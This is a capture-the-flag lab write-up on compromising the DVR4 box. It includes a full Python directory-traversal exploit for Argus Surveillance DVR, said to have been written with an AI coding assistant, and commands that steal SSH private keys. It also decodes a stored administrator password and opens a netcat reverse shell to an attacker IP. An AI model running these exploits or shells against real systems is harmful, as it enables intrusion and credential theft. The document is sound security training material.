# Report - DVR4
- Author: Henry Post
- Target: DVR4
- Target IP: 192.168.52.179
- Date: 04/12/2026
# Executive Summary

The target was enumerated by `nmap` to have an HTTP server open as well as SSH.

The HTTP server is running `Argus Surveillance DVR 4.0.0.0`, which was vulnerable to a Directory Traversal vulnerability. This was used to download private SSH keys, and get a non-SYSTEM shell. 

We log in via SSH as the user `Viewer`.

In addition to private SSH keys, we download `C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini`, which contained the Administrator user's password.

We decode this encoded password using `CVE-2022-25012`, as Argus doesn't use strong encryption for the password, just a static cipher.

We use the recovered password to run a reverse shell as the Administrator user and get SYSTEM level access.
# Recommendations

Do not leave Argus' login page unprotected. Use strong authentication.

Update Argus immediately to patch the Directory Traversal vulnerability.

Do not allow the `Viewer` user to use `runas` to escalate privileges.
# Resources

- https://www.exploit-db.com/exploits/50130
- https://nvd.nist.gov/vuln/detail/CVE-2022-25012
- https://github.com/meltingscales/oscp/blob/main/boxes/provinggrounds/DVR4.pwned/ArgusDirTraverse.py
# Recon

```sh
sudo nano /etc/hosts # add IP to /etc/hosts

???(kali?kali)-[~]
??$ nmap DVR4
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-12 01:50 +0000
Nmap scan report for DVR4 (192.168.53.179)
Host is up (0.00055s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 17.79 seconds
```

We notice SSH and `8080` are open.
# Non-SYSTEM access

We login to `DVR4:8080`.

![](Pasted%20image%2020260412140549.png)

We notice 2 users, Viewer and Administrator.

```sh
searchsploit Argus
# Argus Surveillance DVR 4.0.0.0 - Directory Traversal | windows_x86/webapps/45296.txt

searchsploit -p 45296

cp /usr/share/exploitdb/exploits/windows_x86/webapps/45296.txt ./
```

We find a vulnerability and write an exploit using Claude Code for it, `ArgusDirTraverse.py`.

```python
#!/usr/bin/env python3
"""
Directory traversal utility for DVR4 / WEBACCOUNT.CGI
Usage: python3 dirTraverse.py <target> [path]
       python3 dirTraverse.py <target>       (defaults to Windows/system.ini)

<target> can be:
  192.168.1.10              (IP, uses default port 8080)
  192.168.1.10:9090         (IP with custom port)
  http://DVR4:8080          (full URL)
  http://192.168.1.10       (full URL, uses port from URL or default 8080)

Example paths (use forward slashes; script handles encoding):
  Windows/system.ini
  Windows/win.ini
  Windows/System32/drivers/etc/hosts
"""

import subprocess
import sys
import urllib.parse

DEFAULT_PATH = "Windows/system.ini"
DEFAULT_PORT = 8080
DEPTH = 16  # number of ../ traversal segments


def parse_target(target: str) -> tuple[str, int]:
    """Return (host, port) from a bare IP, IP:port, or http://host:port URL."""
    if "://" in target:
        parsed = urllib.parse.urlparse(target)
        host = parsed.hostname
        port = parsed.port or DEFAULT_PORT
    elif ":" in target:
        host, port_str = target.rsplit(":", 1)
        port = int(port_str)
    else:
        host = target
        port = DEFAULT_PORT
    return host, port


def build_url(host: str, port: int, path: str) -> str:
    # Encode each segment of the path with %2F separators
    encoded_path = "%2F".join(urllib.parse.quote(seg, safe="") for seg in path.split("/"))
    traversal = "..%2F" * DEPTH
    result_page = f"{traversal}{encoded_path}"
    return (
        f"http://{host}:{port}/WEBACCOUNT.CGI"
        f"?OkBtn=++Ok++&RESULTPAGE={result_page}"
        f"&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
    )


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target> [path]")
        sys.exit(1)

    host, port = parse_target(sys.argv[1])
    path = sys.argv[2] if len(sys.argv) >= 3 else DEFAULT_PATH

    url = build_url(host, port, path)
    print(f"[*] Target : {host}:{port}")
    print(f"[*] File   : {path}")
    print(f"[*] URL    : {url}\n")

    result = subprocess.run(
        ["curl", "-s", "-g", url],
        capture_output=True,
        text=True,
    )

    if result.returncode != 0:
        print(f"[!] curl error: {result.stderr.strip()}")
        sys.exit(result.returncode)

    output = result.stdout
    if not output.strip():
        print("[!] Empty response — file may not exist or traversal failed.")
    else:
        print(output)


if __name__ == "__main__":
    main()

```

We try a few payloads, eventually getting a hit.

```bash
python ArgusDirTraverse.py http://DVR4:8080
python ArgusDirTraverse.py http://DVR4:8080 "Windows/system.ini"

# great, now we need to steal the ssh keys.

python ArgusDirTraverse.py http://DVR4:8080 "Users/argus/.ssh/id_rsa"
python ArgusDirTraverse.py http://DVR4:8080 "Users/argus/.ssh/id_rsa.pub"
# nope, let's try id_ed25519

python ArgusDirTraverse.py http://DVR4:8080 "Users/argus/.ssh/id_ed25519"
python ArgusDirTraverse.py http://DVR4:8080 "Users/argus/.ssh/id_ed25519.pub"
# maybe it's a different user.

# http://dvr4:8080/Users.html
# "Administrator" and "Viewer"...

python ArgusDirTraverse.py http://DVR4:8080 "Users/Administrator/.ssh/id_ed25519"
python ArgusDirTraverse.py http://DVR4:8080 "Users/Administrator/.ssh/id_ed25519.pub"
python ArgusDirTraverse.py http://DVR4:8080 "Users/Administrator/.ssh/id_rsa"
python ArgusDirTraverse.py http://DVR4:8080 "Users/Administrator/.ssh/id_rsa.pub"

python ArgusDirTraverse.py http://DVR4:8080 "Users/Viewer/.ssh/id_ed25519"
python ArgusDirTraverse.py http://DVR4:8080 "Users/Viewer/.ssh/id_ed25519.pub"

# We got it!!! These work!!
python ArgusDirTraverse.py http://DVR4:8080 "Users/Viewer/.ssh/id_rsa"
python ArgusDirTraverse.py http://DVR4:8080 "Users/Viewer/.ssh/id_rsa.pub"
```

![](Pasted%20image%2020260412140756.png)

We steal the private key.

![](Pasted%20image%2020260412140834.png)

We login over SSH as the non-SYSTEM user.

```bash
nano stolen_private_key
chmod 600 stolen_private_key

ssh -i stolen_private_key Viewer@DVR4
```

![](Pasted%20image%2020260412140926.png)

We also steal this path, as it contains the user's password. We find the path with some google-fu:

```
C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini
```

```
cd C:\ProgramData\PY_Software\Argus Surveillance DVR
type DVRParams.ini
```

![](Pasted%20image%2020260412141044.png)

The password for the `Administrator` user is:

```
Password0=ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8
```

We use https://www.exploit-db.com/exploits/50130 to decode it.

We guess the last character is `$`, and we are right.

```bash
nano 50130.py
# edit and add our password

python 50130.py

[+] ECB4:1
[+] 53D1:4
[+] 6069:W
[+] F641:a
[+] E03B:t
[+] D9BD:c
[+] 956B:h
[+] FE36:D
[+] BD8F:0
[+] 3CD9:g
[-] D9A8:Unknown

```

`14WatchD0g$`, I am assuming.

# SYSTEM access

Now we can run this to connect to our reverse shell.

```sh
nc -nvlp 4444

runas /user:Administrator "nc.exe -e cmd.exe 192.168.49.52 4444"
14WatchD0g$
```

![](Pasted%20image%2020260412141320.png)

![](Pasted%20image%2020260412141418.png)

We have SYSTEM flag.

![](Pasted%20image%2020260412141407.png)